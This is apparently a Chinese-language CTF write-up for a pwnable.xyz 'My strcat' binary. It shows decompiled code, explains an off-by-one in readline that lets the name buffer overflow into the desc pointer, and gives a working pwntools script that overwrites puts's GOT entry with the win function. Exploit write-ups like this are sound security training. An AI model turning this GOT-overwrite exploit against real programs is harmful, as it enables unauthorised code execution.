安全参数：

```
[*] '/home/noevil/share/pwn/challenge_34/image/challenge/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



代码：

```c
void main(void)

{
  int iVar1;
  size_t sVar2;
  size_t sVar3;
  
  setup();
  puts("My strcat");
  maxlen = 0x80;
  printf("Name: ");
  iVar1 = readline(name,0x80);
  maxlen = maxlen - iVar1;
  desc = (char *)malloc(0x20);
  printf("Desc: ");
  readline(desc,0x20);
  do {
    while( true ) {
      print_menu();
      printf("> ");
      iVar1 = read_int32();
      if (iVar1 != 2) break;
      printf("Desc: ");
      readline(desc,0x20);
    }
    if (iVar1 == 3) {
      printf(name);                  // A
      printf(desc);
      putchar(10);
    }
    else if (iVar1 == 1) {
      printf("Name: ");
      iVar1 = maxlen;
      sVar2 = strlen(name);
      sVar3 = strlen(name);
      iVar1 = readline(name + sVar3,iVar1 - (int)sVar2);
      maxlen = maxlen - iVar1;                  // C
    }
    else {
      puts("Invalid");
    }
  } while( true );
}

int readline(void *param_1,int param_2)

{
  int iVar1;
  size_t sVar2;
  
  read(0,param_1,(long)param_2);
  sVar2 = strlen(name);
  iVar1 = (int)sVar2 + -1;                 // B
  *(undefined *)((long)param_1 + (long)iVar1) = 0;
  return iVar1;
}

```



看到A行以为又是fsb题，又瞄一眼标题，应该是别的思路。

其中B行有点奇怪，当strlen返回0时，readline会返回-1，配合C行可以增加maxlen的大小。

全局变量在内存的位置为：

```
    53: 0000000000602280     4 OBJECT  GLOBAL DEFAULT   25 maxlen
    60: 00000000006022a0   128 OBJECT  GLOBAL DEFAULT   25 name
    71: 0000000000602320     8 OBJECT  GLOBAL DEFAULT   25 desc
```

desc指针正好在name后面0x80的位置，也就是可以通过把maxlen增加到0x80，以覆盖desc的值，从而修改GOT。



脚本：

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
puts_got = e.got['puts']
win_addr = e.symbols['win']
print('puts got:' + hex(puts_got))
print('win address:' + hex(win_addr))


p = remote('svc.pwnable.xyz', 30013)
# p = process('./challenge')


# 将maxlen从0x80增大到0x88，既覆盖desc指针
p.sendlineafter(b'Name: ', p8(0))      // +1
p.sendlineafter(b'Desc: ', b'1')
for i in range(0, 7):                  // +7
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Name: ', p8(0))


# 覆盖desc指针
p.sendlineafter(b'> ', b'1')
payload = (p8(0) * 0x80) + p64(puts_got)
p.sendlineafter(b'Name: ', payload)


# 劫持puts got
p.sendlineafter(b'> ', b'2')
p.sendafter(b'Desc: ', p64(win_addr))


# gdb.attach(p)
p.interactive()

```



